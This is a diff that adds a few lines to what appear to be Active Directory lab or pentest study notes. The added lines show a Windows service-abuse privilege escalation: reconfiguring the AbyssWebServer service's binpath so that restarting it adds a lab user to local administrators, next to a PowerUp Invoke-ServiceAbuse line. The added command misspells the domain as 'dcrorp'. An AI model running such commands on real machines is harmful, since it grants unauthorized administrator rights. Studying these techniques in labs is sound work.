@@ -2617,3 +2617,8 @@ Invoke-ServiceAbuse -Name AbyssWebServer -Username dcorp\student209 -Verbose
 net localgroup administrators
 net localgroup Administrators dcorp\student209 /add
 ```
+```
+sc stop AbyssWebServer 
+sc config AbyssWebServer binpath= "net localgroup administrators dcrorp\student209 /add" 1>NUL
+sc start AbyssWebServer 
+```
